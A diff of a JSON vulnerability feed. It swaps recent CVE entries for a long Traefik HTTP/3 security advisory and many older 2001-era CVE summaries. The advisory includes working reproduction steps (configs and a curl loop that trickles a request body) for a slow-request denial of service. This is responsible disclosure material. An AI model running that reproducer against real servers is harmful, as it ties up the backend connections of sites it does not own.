-      "summary": "The Notiqoo  WordPress plugin before 1.4.14 does not have capability checks on several of its AJAX actions and builds the name of the option to write from user input, allowing users with a role as low as contributor to modify arbitrary WordPress options, which can be used to deactivate Notiqoo  WordPress plugin before 1.4.14 and to lock every administrator out of the site.",
-      "cvssScore": 5.5,
+      "id": "CVE-2026-88012",
+      "summary": "## Summary\n\nThere is a medium severity vulnerability in Traefik's HTTP/3 entry points: the `respondingTimeouts` settings were not applied to the HTTP/3 request path. `readTimeout` in particular is on by default at 60s and is documented as bounding the time to read the entire request including its body, but it is enforced as a deadline on the TCP connection, which cannot reach a QUIC stream, and Traefik's HTTP/3 server was constructed with no timeout of any kind. An unauthenticated client that trickles a request body therefore holds a request open for as long as it chooses, and with it one upstream connection per request, at negligible cost to itself. Backends with bounded connection pools are the practical pressure point.\n\nThe HTTP/3 path lost these timeouts in v2.8.2, when a quic-go API change removed the embedded `http.Server` that had carried them; every release from v2.8.2 onward is affected, and releases before v2.8.2 are not. Traefik v2.8.2 through v2.10.x and v3.0 through v3.6 are affected and are no longer maintained: they will not receive a patch on their own line, and the remedy for their users is to upgrade to v2.11.56 or v3.7.12.\n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.11.56\n- https://github.com/traefik/traefik/releases/tag/v3.7.12\n\n## For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n<details>\n<summary>Original Description</summary>\n\n## Summary\n\n`entryPoints.<name>.transport.respondingTimeouts.readTimeout` is documented as:\n\n> \"Set the timeouts for incoming requests to the Traefik instance. This is the maximum\n> duration for reading the entire request, **including the body**.\" — **Default: 60s**\n\nIt is **on by default** and it works over HTTP/1.1 and HTTP/2. It has **no effect on\nHTTP/3**.\n\nThe consequence is not that a hardening option was left unset. It is that every Traefik\ndeployment with `http3` enabled carries a 60-second bound that the operator has every\nreason to believe is in force, and which is silently absent on that protocol. A single\nclient trickling one body byte every few seconds holds a request open indefinitely, and\nwith it one upstream connection per request.\n\n`readTimeout` is applied as a deadline on the **TCP connection**. HTTP/3 does not have\none, and Traefik's HTTP/3 server is constructed with no timeout of any kind.\n\n## Steps to reproduce\n\nNo containers, VMs or cloud services — the official release binary, `curl`, `openssl`,\nand a 68-line Python standard-library backend. Everything is attached.\n\n```sh\nbash reproduce.sh                 # readTimeout 5s, ~40 seconds\nMODE=default bash reproduce.sh    # the stock 60s default, ~4 minutes\n```\n\nBy hand:\n\n**1. Static config** (`conf/traefik.yml`, complete and unredacted). Note there is no\n`respondingTimeouts` block at all — this is the documented 60s default:\n\n```yaml\nglobal:\n  checkNewVersion: false\n  sendAnonymousUsage: false\n\nlog:\n  level: DEBUG\n\nentryPoints:\n  websecure:\n    address: \":8443\"\n    http3:\n      advertisedPort: 8443\n\nproviders:\n  file:\n    filename: conf/dynamic.yml\n\napi:\n  dashboard: false\n```\n\n**2. Dynamic config** (`conf/dynamic.yml`):\n\n```yaml\nhttp:\n  routers:\n    backend-router:\n      rule: \"PathPrefix(`/`)\"\n      service: backend-svc\n      entryPoints: [websecure]\n      tls: {}\n  services:\n    backend-svc:\n      loadBalancer:\n        servers:\n          - url: \"http://127.0.0.1:8080\"\ntls:\n  certificates:\n    - certFile: cert.pem\n      keyFile: key.pem\n```\n\n**3. A self-signed cert**, so no CA install and no sudo:\n\n```sh\nopenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 30 -nodes \\\n    -subj \"/CN=localhost\" -addext \"subjectAltName=DNS:localhost,IP:127.0.0.1\"\n```\n\n**4. A backend that reads the request body** before responding, as a real HTTP/1.1 server\ndoes (`backend.py`, standard library only). This matters: a backend that answers the\nrequest headers alone lets Traefik release the upstream connection immediately, which\nhides the behaviour entirely.\n\n```sh\npython3 backend.py 8080 &\n./traefik --configFile=conf/traefik.yml\n```\n\n**5. The same slow upload over each protocol.** The hold must exceed the timeout under\ntest, so 92 seconds against the 60-second default:\n\n```sh\n{ for i in $(seq 1 23); do printf 'x'; sleep 4; done; } | \\\n    curl -v -k -T - --http1.1     https://localhost:8443/\n\n{ for i in $(seq 1 23); do printf 'x'; sleep 4; done; } | \\\n    curl -v -k -T - --http3-only  https://localhost:8443/\n```\n\n## Result\n\nTraefik **v3.7.10** (`langres`, go1.26.5), official\n`traefik_v3.7.10_linux_amd64.tar.gz`, sha256\n`01811bb12d44f17280550f425f5e3128d6c325f2665c09e67a651ca535f490ce`.\n\nUpstream connection lifetime measured at the backend — the client's view only shows the\n*absence* of a server action, which proves nothing on its own:\n\n| config | hold | HTTP/1.1 (control) | HTTP/3 |\n|---|---|---|---|\n| **stock — documented 60s default** | 92 s | **59.99 s** — released at the documented default | **92.94 s** — held for the entire window |\n| `readTimeout: 5s` | 30 s | **4.99 s** | **30.98 s** |\n\nThe HTTP/1.1 column is the control and it is the point of the exercise: the timeout is\ndemonstrably live on this exact binary, releasing the upstream at its configured value.\nThe HTTP/3 request, in the same run against the same instance with the same setting, ran\nto completion with the upstream pinned throughout. Traefik returned `499` on the aborted\nHTTP/1.1 arm and took no action at all on HTTP/3 — no `RST_STREAM`, no\n`H3_REQUEST_INCOMPLETE`, no connection close.\n\nThe setting is not being silently discarded: Traefik's own DEBUG log prints the loaded\nstatic configuration including `\"respondingTimeouts\":{\"idleTimeout\":\"3m0s\",\"readTimeout\":\"5s\"}`.\nFull `curl -v` output, backend logs and Traefik DEBUG logs for every arm are in\n`evidence/`.\n\n## Cause\n\n**`readTimeout` is a TCP connection deadline** —\n`pkg/server/server_entrypoint_tcp.go:273`:\n\n```go\nif e.transportConfiguration.RespondingTimeouts.ReadTimeout > 0 {\n    err := writeCloser.SetReadDeadline(time.Now().Add(time.Duration(e.transportConfiguration.RespondingTimeouts.ReadTimeout)))\n```\n\nA deadline on a TCP connection cannot reach a QUIC stream.\n\n**And the HTTP/3 server is given no timeout of any kind** —\n`pkg/server/server_entrypoint_tcp_http3.go:65`:\n\n```go\nh3.Server = &http3.Server{\n    Addr:      config.GetAddress(),\n    Port:      config.HTTP3.AdvertisedPort,\n    Handler:   httpsServer.Server.(*http.Server).Handler,\n    TLSConfig: &tls.Config{GetConfigForClient: h3.getTLSConfigForClient},\n    QUICConfig: &quic.Config{\n        Allow0RTT: false,\n    },\n    ConnContext: func(ctx context.Context, c *quic.Conn) context.Context {\n```\n\nIt reuses the HTTPS server's **handler** and inherits none of its timeouts. There is\ntherefore no duration control on the HTTP/3 request path at all — not `readTimeout`, not\n`idleTimeout`, nothing.\n\nNote that this cannot be fixed by passing a field through: quic-go's `http3.Server`\nexposes no request-read deadline. The remedy has to be enforced around the request body\ninside the handler, or upstream in quic-go.\n\n## Suggested remedy\n\nIn preference order:\n\n1. **Enforce `readTimeout` on the HTTP/3 path in the handler.** Traefik already passes the\n   HTTPS server's handler to `http3.Server`, so when `RespondingTimeouts.ReadTimeout > 0`\n   it can wrap `r.Body` for HTTP/3 requests in a reader that enforces the deadline.\n2. Add a request-read deadline upstream in quic-go's `http3.Server` and pass it through.\n3. **At minimum, document it.** See below — the current documentation does not tell an\n   operator this.\n\n### A sketch of option 1\n\nOffered as a description of the shape, **not as a patch**. I have not built or tested this\nagainst Traefik, and I am not going to present untested code as though I had. If a working,\ntested patch would be useful, say so and I will prepare one properly and verify it against\nthe reproducer above.\n\nWhere the HTTP/3 handler is wired up — `server_entrypoint_tcp_http3.go`, around the\n`http3.Server` construction — the handler passed in could be wrapped so that, when\n`ReadTimeout` is configured, an HTTP/3 request body carries the same deadline the TCP path\ngets from `SetReadDeadline`:\n\n```go\n// Roughly: for HTTP/3 requests only, and only when the timeout is set.\nif readTimeout > 0 && r.ProtoMajor == 3 && r.Body != nil {\n    r.Body = deadlineBody(r.Body, readTimeout)\n}\n```\n\nThe part worth knowing, because it is what makes the approach work rather than merely\nlook tidy: **closing the request body cancels the QUIC stream read.** In quic-go,\n`http3`'s body `Close()` calls `str.CancelRead(...)`, which unblocks a `Read` that is\nalready parked waiting on the client. So a timer that closes the body on expiry bounds\nboth a client that trickles *and* a client that simply stops sending — the latter being\nthe case a wrapper that only checks the clock on each returning `Read` would miss\nentirely.\n\nReturning `os.ErrDeadlineExceeded` from the wrapped `Read` keeps the failure classified as\na timeout rather than a client abort, which matters for whatever status code and logging\nyou decide is right.\n\nTwo design questions I would not want to answer on your behalf: whether HTTP/3 should reuse\n`respondingTimeouts.readTimeout` or get its own setting, and whether enforcement belongs in\nthe handler wrapper or somewhere closer to the entrypoint. Both are your call.\n\n## A documentation issue, separately\n\nTwo things in the docs are worth correcting regardless of how the code question is\nresolved.\n\n**1. The `readTimeout` description carries no protocol qualification.** It says \"the\nmaximum duration for reading the entire request, including the body\", which is exactly\nwhat an operator relies on. The entrypoint page does note that respondingTimeouts have\n\"no effect for UDP entryPoints\", but that does not cover this case: HTTP/3 here is served\non an **HTTP** entrypoint with an `http3:` block, not on a Traefik **UDP entrypoint**,\nwhich is a separate feature for UDP routers. An operator who adds `http3:` to their\nexisting HTTPS entrypoint has not created a UDP entrypoint and has no reason to read that\ncaveat as applying to them.\n\n**2. `SECURITY.md`'s supported-versions table is stale.** It lists `3.6.x` as supported\nand `< 3.6.x` as unsupported, while 3.7.10 is the current release. Anyone checking whether\ntheir version is in scope before reporting gets a confusing answer.\n\n## Impact\n\nEach held request occupies one upstream connection for as long as the client chooses, at\nnegligible cost to the client, and the same client can open many. Backends with bounded\nconnection pools are the practical pressure point.\n\nI have **not** measured a concurrency ceiling on Traefik itself, so I am not asserting\none. If that number matters to your assessment, tell me and I will measure it.\n\n## LLM (\"AI\") use disclosure\n\nNot required by your policy, but stated because it is true and you should be able to\nweigh it. I am a penetration tester, not a Go developer. The finding, the attack concept\nand the decision to measure the upstream leg rather than the client are mine. An LLM\ncoding assistant (Claude) built the test harness, ran the matrix, and located the two\nsource citations; I verified those by hand against the `v3.7.10` tag and ran the\nreproducer myself. I am a human and I will be the one replying in this thread.\n\n## Disclosure\n\nBishop Fox operates a 90-day disclosure policy, starting the day this is submitted, with\nextensions where a fix is in progress. Tell me what you would prefer and I will work to\nit.\n\n## Environment\n\n- Traefik v3.7.10, official `traefik_v3.7.10_linux_amd64.tar.gz`,\n  sha256 `01811bb12d44f17280550f425f5e3128d6c325f2665c09e67a651ca535f490ce`\n- Kali GNU/Linux (WSL2), kernel 6.6.114.1\n- curl 8.19.0 with ngtcp2 1.21.0 / nghttp3 1.15.0### Summary\n_Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server._\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\n### PoC\n_Complete instructions, including specific configuration details, to reproduce the vulnerability._\n\n### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\n</details>",
+      "cvssScore": 5.3,
       "severity": "Medium",
       "published": "2026-09-10",
       "modified": "2026-09-10",
-      "cwe": null,
+      "cwe": {
+        "cwe_id": "CWE-770",
+        "name": "Allocation of Resources Without Limits or Throttling"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-19840",
-        "https://wpscan.com/vulnerability/030939ee-9aa9-4082-934e-c9a07fc3dfc3"
+        "https://github.com/traefik/traefik/security/advisories/GHSA-7ghq-v6jf-g56c",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-88012",
+        "https://github.com/traefik/traefik/pull/13717",
+        "https://github.com/traefik/traefik/commit/a8d0bc425859dde7481a6c9a324e610b81d754d0",
+        "https://github.com/traefik/traefik/releases/tag/v2.11.56"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "github.com/traefik/traefik/v2 go",
+        "github.com/traefik/traefik/v3 go"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-77770",
-      "summary": "The miniOrange 2FA  WordPress plugin before 6.3.1, miniOrange 2FA  WordPress plugin before 19.3 does not require a validated transaction before deleting site options whose names come from unauthenticated request input, allowing any visitor to delete arbitrary options, which can lock every administrator out of the dashboard or deactivate every miniOrange 2FA  WordPress plugin before 6.3.1, miniOrange 2FA  WordPress plugin before 19.3 on the site.",
-      "cvssScore": 9.3,
-      "severity": "Critical",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77770",
-        "https://wpscan.com/vulnerability/68bc7294-1ee6-44a9-9995-3b23b921f750"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-0304",
-      "summary": "A privilege escalation vulnerability in Palo Alto Networks Cortex XDR Broker VM enables an authenticated low privileged user with man-in-the-middle (MitM) access to execute code with root privileges on the Broker VM.",
-      "cvssScore": null,
+      "id": "CVE-2001-1305",
+      "summary": "ICQ 2001a Alpha and earlier allows remote attackers to automatically add arbitrary UINs to an ICQ user's contact list via a URL to a web page with a Content-Type of application/x-icq, which is processed by Internet Explorer.",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
+      "published": "2001-08-17",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-0304",
-        "https://security.paloaltonetworks.com/CVE-2026-0304"
+        "http://marc.info/?l=bugtraq&m=99851887024728&w=2",
+        "http://www.iss.net/security_center/static/7028.php",
+        "http://www.securityfocus.com/bid/3226",
+        "http://marc.info/?l=bugtraq&m=99851887024728&w=2",
+        "http://www.iss.net/security_center/static/7028.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-78361",
-      "summary": "The zipMoney(Zip Co) Payments Plugin for WooCommerce WordPress plugin before 2.4.0 does not perform any authorisation checks on one of its front-end request handlers, and does not restrict which option name a caller may supply, allowing unauthenticated users to delete arbitrary WordPress options. This can be used to destroy site and access control configuration, deactivate every installed zipMoney(Zip Co) Payments Plugin for WooCommerce WordPress plugin before 2.4.0, and take the site offline.",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-78361",
-        "https://wpscan.com/vulnerability/8b9a00f5-d7f5-447d-b109-d15e2cde3885"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-81431",
-      "summary": "The Registration Form for WooCommerce WordPress plugin before 1.1.3 does not validate that the form referenced during registration is a legitimate registration form, reading the permitted-role allow-list from an arbitrary attacker-controlled post instead. A user able to create a post (Contributor and above) can therefore register a new account with an arbitrary role, including Administrator, leading to full site takeover. This is an incomplete fix of CVE-2026-54807.",
-      "cvssScore": 5.5,
+      "id": "CVE-2000-1203",
+      "summary": "Lotus Domino SMTP server 4.63 through 5.08 allows remote attackers to cause a denial of service (CPU consumption) by forging an email message with the sender as bounce@[127.0.0.1] (localhost), which causes Domino to enter a mail loop.",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
+      "published": "2001-08-20",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-81431",
-        "https://wpscan.com/vulnerability/e1255dd5-90d9-4ccf-9f84-3d1b41c5cba4"
+        "http://marc.info/?l=vuln-dev&m=95886062521327&w=2",
+        "http://www.securityfocus.com/archive/1/209754",
+        "http://www.securityfocus.com/bid/3212",
+        "http://www.securityfocus.com/cgi-bin/archive.pl?id=1&start=2002-01-21&end=2002-01-27&mid=209116&threads=1",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7012"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-0303",
-      "summary": "A code execution vulnerability in Palo Alto Networks Checkov by Prisma® Cloud can allow arbitrary code execution when Checkov scans a directory that contains an attacker-controlled configuration file.",
-      "cvssScore": null,
+      "id": "CVE-2001-1131",
+      "summary": "Directory traversal vulnerability in WhitSoft Development SlimFTPd 2.2 allows an attacker to read arbitrary files and directories via a ... (modified dot dot) in the CD command.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-08-21",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securiteam.com/windowsntfocus/5RP0L0055O.html",
+        "http://www.securiteam.com/windowsntfocus/5RP0L0055O.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1133",
+      "summary": "Vulnerability in a system call in BSDI 3.0 and 3.1 allows local users to cause a denial of service (reboot) in the kernel via a particular sequence of instructions.",
+      "cvssScore": 2.1,
       "severity": "Low",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
+      "published": "2001-08-21",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-0303",
-        "https://security.paloaltonetworks.com/CVE-2026-0303"
+        "http://www.iss.net/security_center/static/7023.php",
+        "http://www.securityfocus.com/archive/1/209192",
+        "http://www.securityfocus.com/bid/3220",
+        "http://www.iss.net/security_center/static/7023.php",
+        "http://www.securityfocus.com/archive/1/209192"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-81635",
-      "summary": "A cross-site scripting vulnerability exists in SHIRASAGI, which may allow an attacker to execute an arbitrary script in the web browser of a user who accesses a website using the affected product.",
-      "cvssScore": 3.8,
-      "severity": "Low",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-81635",
-        "https://jvn.jp/en/jp/JVN37476837",
-        "https://www.ss-proj.org/support/1710.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-82582",
-      "summary": "An authorization bypass vulnerability exists in SHIRASAGI through a user-controlled key, which may allow an unauthorized attacker to retrieve files from the groupware's shared file feature.",
-      "cvssScore": 4.2,
+      "id": "CVE-2001-1149",
+      "summary": "Panda Antivirus Platinum before 6.23.00 allows a remore attacker to cause a denial of service (crash) when a user selects an action for a malformed UPX packed executable file.",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
+      "published": "2001-08-21",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-82582",
-        "https://jvn.jp/en/jp/JVN37476837",
-        "https://www.ss-proj.org/support/1710.html"
+        "http://www.osvdb.org/5456",
+        "http://www.securityfocus.com/archive/82/209328",
+        "http://www.osvdb.org/5456",
+        "http://www.securityfocus.com/archive/82/209328"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-77771",
-      "summary": "The miniOrange 2FA  WordPress plugin before 6.3.1, miniOrange 2FA  WordPress plugin before 19.3 does not scope its second-factor attempt limit to the account being attacked, keying it instead to an identifier the client supplies and can change at will, allowing an attacker who already knows a victim's password to make unlimited one-time-passcode guesses and defeat the second factor. A second validation endpoint applies no attempt limit at all.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
+      "id": "CVE-2001-1166",
+      "summary": "linprocfs on FreeBSD 4.3 and earlier does not properly restrict access to kernel memory, which allows one process with debugging rights on a privileged process to read restricted memory from that process.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-08-21",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77771",
-        "https://wpscan.com/vulnerability/e1e57673-18cb-4157-9d58-547af7101b04"
+        "ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-01:55.procfs.asc",
+        "http://www.iss.net/security_center/static/7017.php",
+        "http://www.osvdb.org/1938",
+        "http://www.securityfocus.com/bid/3217",
+        "ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-01:55.procfs.asc"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-87804",
-      "summary": "Rejected reason: no security impact",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
+      "id": "CVE-2001-1295",
+      "summary": "Directory traversal vulnerability in Cerberus FTP Server 1.5 and earlier allows remote attackers to read arbitrary files via a .. (dot dot) in the CD command.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-08-21",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-87804"
+        "http://www.greenepa.net/~averett/cerberus-releasenotes.htm#ReleaseNotes",
+        "http://www.iss.net/security_center/static/7004.php",
+        "http://www.securiteam.com/windowsntfocus/5SP0M0055W.html",
+        "http://www.greenepa.net/~averett/cerberus-releasenotes.htm#ReleaseNotes",
+        "http://www.iss.net/security_center/static/7004.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-19439",
-      "summary": "The Ultimate Gift Cards for WooCommerce WordPress plugin before 3.2.10 does not have any authorisation check when displaying gift card details, allowing unauthenticated users to retrieve the gift cards attached to arbitrary orders and disclose customer personal data, balances, dates and, in 3.2.9, the live redemption code, which anyone holding it can spend.\n\nVersions from 3.0.3 to 3.2.8 disclose the same data without the redemption code.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-19439",
-        "https://wpscan.com/vulnerability/daefdabe-2277-4753-9df5-581134540000"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-7188",
-      "summary": "Improper neutralization of special elements used in an SQL command ('SQL injection') vulnerability in Armiya Information Technologies Ltd. Co. Access Control System allows SQL Injection.\n\nThis issue affects Access Control System: before Versiyon 2.",
-      "cvssScore": 8.1,
+      "id": "CVE-2001-0357",
+      "summary": "FormMail.pl in FormMail 1.6 and earlier allows a remote attacker to send anonymous email (spam) by modifying the recipient and message parameters.",
+      "cvssScore": 7.5,
       "severity": "High",
-      "published": "2026-09-10",
-      "modified": "2026-09-10",
+      "published": "2001-08-22",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-7188",
-        "https://siberguvenlik.gov.tr/guvenlik-bildirimleri/detay/tr-26-1061"
+        "http://marc.info/?l=bugtraq&m=98433523520344&w=2",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6242",
+        "http://marc.info/?l=bugtraq&m=98433523520344&w=2",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6242"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0394",
+      "summary": "Remote manager service in Website Pro 3.0.37 allows remote attackers to cause a denial of service via a series of malformed HTTP requests to the /dyn directory.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0425.html",
+        "http://www.osvdb.org/5669",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6295",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0425.html",
+        "http://www.osvdb.org/5669"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0556",
+      "summary": "The Nirvana Editor (NEdit) 5.1.1 and earlier allows a local attacker to overwrite other users' files via a symlink attack on (1) backup files or (2) temporary files used when nedit prints a file or portions of a file.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.debian.org/security/2001/dsa-053",
+        "http://www.linux-mandrake.com/en/security/2001/MDKSA-2001-042.php3",
+        "http://www.nedit.org/archives/develop/2001-Feb/0391.html",
+        "http://www.novell.com/linux/security/advisories/2001_014_nedit.html",
+        "http://www.redhat.com/support/errata/RHSA-2001-061.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0560",
+      "summary": "Buffer overflow in Vixie cron 3.0.1-56 and earlier could allow a local attacker to gain additional privileges via a long username (> 20 characters).",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0197.html",
+        "http://archives.neohapsis.com/archives/linux/immunix/2001-q1/0066.html",
+        "http://www-1.ibm.com/support/search.wss?rs=0&q=IY17048&apar=only",
+        "http://www-1.ibm.com/support/search.wss?rs=0&q=IY17261&apar=only",
+        "http://www.linux-mandrake.com/en/security/2001/MDKSA-2001-022.php3"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0564",
+      "summary": "APC Web/SNMP Management Card prior to Firmware 310 only supports one telnet connection, which allows a remote attacker to create a denial of service via repeated failed logon attempts which temporarily locks the card.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.apcftp.com/hardware/webcard/firmware/sy/v310/install.txt",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0436.html",
+        "http://www.securityfocus.com/bid/2430",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6199",
+        "ftp://ftp.apcftp.com/hardware/webcard/firmware/sy/v310/install.txt"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0568",
+      "summary": "Digital Creations Zope 2.3.1 b1 and earlier allows a local attacker (Zope user) with through-the-web scripting capabilities to alter ZClasses class attributes.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000382",
+        "http://www.debian.org/security/2001/dsa-043",
+        "http://www.linux-mandrake.com/en/security/2001/MDKSA-2001-025.php3",
+        "http://www.redhat.com/support/errata/RHSA-2001-021.html",
+        "http://www.zope.org/Products/Zope/Products/Zope/Products/Zope/Hotfix_2001-02-23"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0569",
+      "summary": "Digital Creations Zope 2.3.1 b1 and earlier contains a problem in the method return values related to the classes (1) ObjectManager, (2) PropertyManager, and (3) PropertySheet.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000382",
+        "http://www.debian.org/security/2001/dsa-043",
+        "http://www.linux-mandrake.com/en/security/2001/MDKSA-2001-025.php3",
+        "http://www.redhat.com/support/errata/RHSA-2001-021.html",
+        "http://www.zope.org/Products/Zope/Products/Zope/Products/Zope/Hotfix_2001-02-23"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0571",
+      "summary": "Directory traversal vulnerability in the web server for (1) Elron Internet Manager (IM) Message Inspector and (2) Anti-Virus before 3.0.4 allows remote attackers to read arbitrary files via a .. (dot dot) in the requested URL.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0382.html",
+        "http://marc.info/?l=bugtraq&m=98538867727489&w=2",
+        "http://marc.info/?l=bugtraq&m=98567864203963&w=2",
+        "http://www.securityfocus.com/bid/2519",
+        "http://www.securityfocus.com/bid/2520"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0572",
+      "summary": "The SSH protocols 1 and 2 (aka SSH-2) as implemented in OpenSSH and other packages have various weaknesses which can allow a remote attacker to obtain the following information via sniffing: (1) password lengths or ranges of lengths, which simplifies brute force password guessing, (2) whether RSA or DSA authentication is being used, (3) the number of authorized_keys in RSA authentication, or (4) the lengths of shell commands.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0225.html",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000391",
+        "http://www.kb.cert.org/vuls/id/596827",
+        "http://www.linux-mandrake.com/en/security/2001/MDKSA-2001-033.php3",
+        "http://www.redhat.com/support/errata/RHSA-2001-033.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0575",
+      "summary": "Buffer overflow in lpshut in SCO OpenServer 5.0.6 can allow a local attacker to gain additional privileges via a long first argument to lpshut.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0404.html",
+        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6290",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0404.html",
+        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0576",
+      "summary": "lpusers as included with SCO OpenServer 5.0 through 5.0.6 allows a  local attacker to gain additional privileges via a buffer overflow attack in the '-u' command line parameter.",
+      "cvssScore": 4.6,
